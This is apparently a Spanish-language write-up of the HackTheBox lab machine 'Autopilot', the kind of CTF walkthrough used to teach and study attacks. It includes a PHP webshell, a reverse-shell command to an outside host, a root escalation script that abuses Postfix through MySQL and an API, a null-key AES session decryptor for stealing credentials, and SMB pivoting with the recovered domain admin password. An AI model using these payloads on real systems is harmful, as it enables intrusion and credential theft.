---
title: Autopilot
description: Autopilot es una máquina Insane en HackTheBox que simula un entorno corporativo híbrido. La superficie de ataque inicial consiste en un servidor Linux ejecutando Grommunio (una suite de correo y colaboración basada en Nextcloud) expuesto a través de WebDAV, PHP y Postfix. El compromiso de este servidor Linux actúa como puerta de entrada y pivote hacia una red interna de Active Directory, compuesta por un servidor de aplicaciones Windows (WS02) y un Controlador de Dominio (DC01). El reto destaca por requerir técnicas de descifrado criptográfico (AES con clave nula) y la ingeniería inversa de un binario compilado en Go para la extracción de credenciales.
date: 2026-10-20
toc: true
pin: false
image: assets/img/htb-writeup-autopilot/logo.png
categories:
  - Hack The Box
  - Windows
  - Linux
  - Linux_PrivEsc
  - Active-Directory
  - Insane
tags:
  - Grommunio
  - Postfix_DBConf_to_Root
  - Active_Directory
  - WebDAV
  - RCE
  - PrivEsc
  - Postfix
  - Chisel
  - AES_Decrypt
  - Go_Reverse
  - XOR
  - impacket
  - ProxyChains
  - SUID
---
##  Recon

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
```

```bash
nmap -p443 -Pn -sCV 10.129.x.x -oN targeted
```


El único puerto abierto es el **443 (HTTPS)**. Los certificados SSL revelan los dominios `grommunio.autopilot.htb`, `mail.autopilot.htb`, `autodiscover.autopilot.htb`. Añadimos el dominio principal a nuestro `/etc/hosts`.

---

## Foothold: RCE 

Iniciamos sesión en Grommunio Web con las credenciales iniciales `deborah.hernandez:8F5cqp@tC8g@`.

1.  Habilitamos el plugin de archivos y subimos una webshell PHP (`shell.php` con `<?php system($_GET['cmd']); ?>`).
2.  Al intentar acceder a la ruta de descarga tradicional, el servidor devolvía el código como texto plano. Sin embargo, accediendo a la **ruta física del backend de Nextcloud**, el servidor Nginx ejecuta el código.

```bash

curl -k -G 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.53/9001 0>&1"'
```

*   **Resultado:** Reverse shell obtenida como el usuario `grofiles`.

---

##  PrivEsc - linux root 'Postfix Hijacking'

Enumerando el sistema, encontramos credenciales de MySQL en los archivos de configuración: `grommunio:gDq6z9YVe4nyNRe5`.

El servidor tiene una API de administración interna en `[::1]:8080`. Abusamos de ella y de la configuración de Postfix para ejecutar código como root.

**Script de escalada**:

```bash

#!/bin/sh
MYSQL_USER="grommunio"
MYSQL_PASS="gDq6z9YVe4nyNRe5"
MYSQL_DB="grommunio"
API="http://[::1]:8080/api/v1"
PFX_DIR="/var/lib/grommunio-files/data/pfx"
SCRIPT="$PFX_DIR/postfix-script"


mkdir -p "$PFX_DIR"
printf '#!/bin/sh\nchmod 4755 /bin/bash\n' > "$SCRIPT"
chmod 755 "$SCRIPT"


HASH=$(openssl passwd -6 -salt sVnwqyTFDg9nS/Ry 'admin123')
mysql -u "$MYSQL_USER" -p"$MYSQL_PASS" -h localhost "$MYSQL_DB" -e "UPDATE users SET password='$HASH' WHERE id=0;"


RESP=$(curl -sk -X POST "$API/login" -d 'user=admin&pass=admin123')
TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('grommunioAuthJwt',''))")
CSRF=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('csrf',''))")


mysql -u "$MYSQL_USER" -p"$MYSQL_PASS" -h localhost "$MYSQL_DB" -e "INSERT INTO configs (service, file, \`key\`, value) VALUES ('grommunio-dbconf', 'postfix', 'commit_file', 'sudo postconf -e \$FILE_S && systemctl reload postfix') ON DUPLICATE KEY UPDATE value='sudo postconf -e \$FILE_S && systemctl reload postfix';"


curl -sk --cookie "grommunioAuthJwt=$TOKEN" -H "X-CSRF-TOKEN: $CSRF" -X PUT "$API/system/dbconf/postfix/main.cf/" -H 'Content-Type: application/json' -d '{"data": {"daemon_directory": "/var/lib/grommunio-files/data/pfx"}}'


curl -sk --cookie "grommunioAuthJwt=$TOKEN" -H "X-CSRF-TOKEN: $CSRF" -X POST "$API/system/dashboard/service/restart"

```

ejecutamos y verificamos el SUID en bash y escalamos: `bash -p` -> **root**

---

## credential dumping - "AES Session Decrypt"

Como `root`, buscamos archivos de sesión de la web en `/var/lib/grommunio-web/session/`. Estos archivos están cifrados con AES y una **clave nula**.

1.  Empaquetamos los archivos y los transferimos a nuestra máquina usando:

    `python3 -m http.server` en la víctima y `proxychains` + `wget`.

3.  + descifrar localmente con un script en Python.


**Script**
```python

import os
import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_session_file(filepath):
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    iv_match = re.search(r'encryption-store-iv\|s:32:"([a-f0-9]+)"', content)
    if not iv_match: return None
    
    iv = bytes.fromhex(iv_match.group(1))
    key = b'\x00' * 32 

    creds = {}
    for field in ['username', 'password']:
        pattern = rf's:{len(field)}:"{field}";a:1:{% raw %}{{s:3:"val";s:\d+:"([^"]+)";}}{% endraw %}'
        match = re.search(pattern, content)
        
        if match:
            b64_data = match.group(1)
            try:
                encrypted_data = base64.b64decode(b64_data)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                decrypted_data = cipher.decrypt(encrypted_data)
                creds[field] = unpad(decrypted_data, AES.block_size).decode('utf-8')
            except Exception: pass 
    return creds

for filename in os.listdir('.'):
    if filename.startswith('sess_'):
        creds = decrypt_session_file(filename)
        if creds and 'username' in creds:
            print(f"Usuario: {creds.get('username')} | Password: {creds.get('password')}")
```

* y obtenemos las credenciales de `stephanie.lewis:NKUOji@4bAJw`.

---

## Pivoting

##### Chisel

al Configurar un túnel inverso para acceder a la red interna `172.16.20.0/24`.

```bash

# tu maquina
sudo ./chisel server -p 443 --reverse

# la maquina victima
/tmp/chisel client 10.10.15.203:443 R:socks
```

Configuramos `proxychains4` en el puerto `1080` y usamos `netexec` para identificar los hosts:

*   **DC01:** `172.16.20.1`
*   **WS02:** `172.16.20.15`

### binario en `Go` 

Validar que Stephanie es admin en WS02:
```bash

proxychains4 -q netexec smb 172.16.20.15 -u 'stephanie.lewis' -p 'NKUOji@4bAJw' -d autopilot.htb

```

al comprobarlo nos conectamos vía SMB y descargamos el binario `runas.exe` de su carpeta `Videos`:

```bash

proxychains4 -q smbclient.py 'AUTOPILOT/stephanie.lewis:NKUOji@4bAJw@172.16.20.15'

# use C$
# cd Users\stephanie.lewis\Videos
# get runas.exe

```

### reverse 'XOR'

El binario Go contiene la contraseña del Domain Admin ofuscada con XOR. Usamos `go tool nm` para encontrar las variables y un script en Python  "`pefile`"  para extraer y decodificar los bytes.

```python

import pefile
pe = pefile.PE("runas.exe")
ib = 0x140000000

def va_to_off(va):
    rva = va - ib
    for sec in pe.sections:
        if sec.VirtualAddress <= rva < sec.VirtualAddress + sec.Misc_VirtualSize:
            return sec.PointerToRawData + (rva - sec.VirtualAddress)
    return None


cipher_off = va_to_off(0x1401ac6c8)
key_off    = va_to_off(0x1401ac6d8)

cipher = pe.__data__[cipher_off:cipher_off+14]
key = pe.__data__[key_off:key_off+14]

pt = bytes([c ^ key[i % len(key)] for i, c in enumerate(cipher)])
print(f"Credenciales del DA: {pt.decode()}")

```

*  obtenemos la contraseña del DA: `krFqXfDI1y4331`.

---

#### end

con las creds del Domain Admin (`da-stephanie.lewis`), es conectarse al DC01 (`172.16.20.1`) y buscar la flag final.

```bash

proxychains4 -q smbclient.py 'AUTOPILOT/da-stephanie.lewis:krFqXfDI1y4331@172.16.20.1'

```

```text

# use C$

# cd Users\Administrator\Desktop

# get root.txt

# exit

```

*   **root flag:** `5f192fb249b1e18a0e487e0013237246`

---

## Rabbit Holes

Durante la resolución, se identificaron varias rutas que, aunque documentadas en foros, resultaron ser 
ineficientes o bloqueadas:

1.  **NTLM Relay (IMAP a SMB):** Se intentó interceptar la autenticación del servicio IMAP para relayarla a WS02. El SMB signing deshabilitado lo permitía, pero la configuración requerida era extremadamente compleja. Se optó por la ruta de descifrado AES, que era directa.

2.  **Grupo DnsAdmins:** El usuario `sa-joshua.harris` pertenecía a este grupo, pero solo tenía acceso a `IPC$` en WS02/DC01, sin capacidad de cargar una DLL maliciosa en el servicio DNS.

3.  **Credenciales de Joshua:** Las credenciales de `sa-joshua.harris` (`65SskH37nyQ01S`) no otorgaban privilegios de DCSync directos. El error `ERROR_DS_DRA_BAD_DN` confirmó que la cuenta no tenía permisos de replicación, haciendo obligatorio el paso por Stephanie.

![](assets/img/htb-writeup-autopilot/2.png)